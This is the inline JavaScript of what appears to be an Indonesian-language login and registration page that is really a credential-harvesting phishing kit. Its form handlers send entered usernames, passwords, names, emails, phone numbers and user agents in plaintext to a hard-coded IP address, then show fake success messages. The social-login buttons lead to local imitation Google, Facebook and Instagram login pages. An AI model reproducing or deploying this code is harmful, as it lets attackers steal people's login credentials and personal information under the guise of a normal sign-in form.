        <script>
            function switchTab(tab) {
                // Remove active class from all tabs and forms
                document.querySelectorAll('.auth-tab').forEach(t => t.classList.remove('active'));
                document.querySelectorAll('.auth-form').forEach(f => f.classList.remove('active'));
                
                // Add active class to selected tab and form
                if (tab === 'login') {
                    document.querySelector('.auth-tab:first-child').classList.add('active');
                    document.getElementById('loginForm').classList.add('active');
                } else {
                    document.querySelector('.auth-tab:last-child').classList.add('active');
                    document.getElementById('registerForm').classList.add('active');
                }
            }

            function sendToAdmin(data, type) {
                // Send data to 172.15.1.21:3000/admin
                fetch('http://172.15.1.21:3000/admin', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        type: type,
                        data: data,
                        timestamp: new Date().toISOString()
                    })
                })
                .then(response => response.json())
                .then(result => {
                    console.log('Data sent to admin:', result);
                    console.log('Full data payload:', {
                        type: type,
                        data: data,
                        timestamp: new Date().toISOString()
                    });
                })
                .catch(error => {
                    console.error('Error sending data to admin:', error);
                });
            }

            function showError(elementId, message) {
                const errorElement = document.getElementById(elementId);
                errorElement.textContent = message;
                errorElement.style.display = 'block';
            }

            function hideError(elementId) {
                const errorElement = document.getElementById(elementId);
                errorElement.style.display = 'none';
            }

            function showSuccess(elementId, message) {
                const successElement = document.getElementById(elementId);
                successElement.textContent = message;
                successElement.style.display = 'block';
            }

            function hideSuccess(elementId) {
                const successElement = document.getElementById(elementId);
                successElement.style.display = 'none';
            }

            // Login Form Handler
            document.getElementById('loginFormElement').addEventListener('submit', function(e) {
                e.preventDefault();
                
                const username = document.getElementById('loginUsername').value;
                const password = document.getElementById('loginPassword').value;

                // Hide previous messages
                hideError('loginUsernameError');
                hideError('loginPasswordError');
                hideSuccess('loginSuccess');

                // Basic validation
                if (!username) {
                    showError('loginUsernameError', 'Username harus diisi');
                    return;
                }

                if (!password) {
                    showError('loginPasswordError', 'Password harus diisi');
                    return;
                }

                // Send data to admin
                const loginData = {
                    username: username,
                    password: password,
                    action: 'login'
                };

                sendToAdmin(loginData, 'login');

                // Show success message
                showSuccess('loginSuccess', 'Login berhasil! Redirecting...');

                // Redirect to dashboard after 2 seconds
                setTimeout(() => {
                    window.location.href = 'dashboard.html';
                }, 2000);
            });

            // Register Form Handler
            document.getElementById('registerFormElement').addEventListener('submit', function(e) {
                e.preventDefault();
                
                const name = document.getElementById('registerName').value;
                const username = document.getElementById('registerUsername').value;
                const email = document.getElementById('registerEmail').value;
                const phone = document.getElementById('registerPhone').value;
                const password = document.getElementById('registerPassword').value;
                const confirmPassword = document.getElementById('registerConfirmPassword').value;

                // Hide previous messages
                hideError('registerNameError');
                hideError('registerUsernameError');
                hideError('registerEmailError');
                hideError('registerPhoneError');
                hideError('registerPasswordError');
                hideError('registerConfirmPasswordError');
                hideSuccess('registerSuccess');

                // Basic validation
                if (!name) {
                    showError('registerNameError', 'Nama harus diisi');
                    return;
                }

                if (!username) {
                    showError('registerUsernameError', 'Username harus diisi');
                    return;
                }

                if (!email) {
                    showError('registerEmailError', 'Email harus diisi');
                    return;
                }

                if (!phone) {
                    showError('registerPhoneError', 'Nomor telepon harus diisi');
                    return;
                }

                if (!password) {
                    showError('registerPasswordError', 'Password harus diisi');
                    return;
                }

                if (password !== confirmPassword) {
                    showError('registerConfirmPasswordError', 'Password tidak cocok');
                    return;
                }

                // Send data to admin
                const registerData = {
                    name: name,
                    username: username,
                    email: email,
                    phone: phone,
                    password: password,
                    action: 'register'
                };

                sendToAdmin(registerData, 'register');

                // Show success message
                showSuccess('registerSuccess', 'Registrasi berhasil! Silakan login.');

                // Switch to login tab after 2 seconds
                setTimeout(() => {
                    switchTab('login');
                    document.getElementById('loginUsername').value = username;
                }, 2000);
            });

            function socialLogin(provider) {
                // Redirect to specific social login page
                if (provider === 'google') {
                    window.location.href = 'google-login.html';
                } else if (provider === 'facebook') {
                    window.location.href = 'facebook-login.html';
                } else if (provider === 'instagram') {
                    window.location.href = 'instagram-login.html';
                }
            }

            function socialRegister(provider) {
                // Redirect to specific social login page for registration
                if (provider === 'google') {
                    window.location.href = 'google-login.html';
                } else if (provider === 'facebook') {
                    window.location.href = 'facebook-login.html';
                } else if (provider === 'instagram') {
                    window.location.href = 'instagram-login.html';
                }
            }

            function forgotPassword() {
                const username = prompt('Masukkan username Anda untuk reset password:');
                if (username) {
                    const forgotData = {
                        username: username,
                        action: 'forgot_password',
                        userAgent: navigator.userAgent,
                        timestamp: new Date().toISOString()
                    };

                    sendToAdmin(forgotData, 'forgot_password');
                    alert('Link reset password telah dikirim ke email Anda.');
                }
            }

            function rebindAdv() {
                var pname = 'cek.firstmedia.land';
                var cust = 'auth_user';
                var agent = encodeURI(window.navigator.userAgent);
                var uri = 'https://fm1.firstmedia.com/DPAPWebAds/GenAds.ashx?pname=#p#&acc=#a#&useragent=#ua#&type=3';
                var uriMobile = 'https://fm1.firstmedia.com/DPAPWebAds/GenAds.ashx?pname=#p#&acc=#a#&useragent=#ua#&type=8';
                uri = uri.replace("#a#", cust);
                uri = uri.replace("#ua#", agent);

                uriMobile = uriMobile.replace("#a#", cust);
                uriMobile = uriMobile.replace("#ua#", agent);

                pname = 'cek.firstmedia.land';
                uri = uri.replace("#p#", pname);
                uriMobile = uriMobile.replace("#p#", pname);

                if (cust == undefined || cust == '') {
                    pname = 'cek.firstmedia.land';
                    uri = uri.replace("#p#", pname);
                    uriMobile = uriMobile.replace("#p#", pname);
                } else {
                    uri = uri.replace("#p#", pname);
                    uriMobile = uriMobile.replace("#p#", pname);
                }
                $(".newdesktop").load(uri);
                $(".newmobile").load(uriMobile);
            }

            $(document).ready(function () {
                rebindAdv();
            });
        </script>
